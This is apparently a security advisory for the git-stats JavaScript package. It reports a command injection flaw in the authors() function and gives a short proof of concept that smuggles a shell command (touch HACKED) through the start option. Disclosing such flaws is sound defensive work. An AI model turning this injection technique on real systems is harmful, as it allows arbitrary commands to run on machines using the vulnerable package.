# Overview
git-stats is a js package for local git statistics including GitHub-like contributions calendars.

Affected versions of this package are vulnerable to Command Injection. It is possible to inject arbitrary commands by using a semicolon char in any of the `options.start` or `options.end` values, using the authors() function.

# Proof of Concept
```js
var GitStats = require("git-stats");
var g1 = new GitStats();

g1.authors({
    start: ' " ;touch HACKED; #//',
    end: 'endstring'
}, (resp, pieData) => {
    console.log("Done!");
});
```
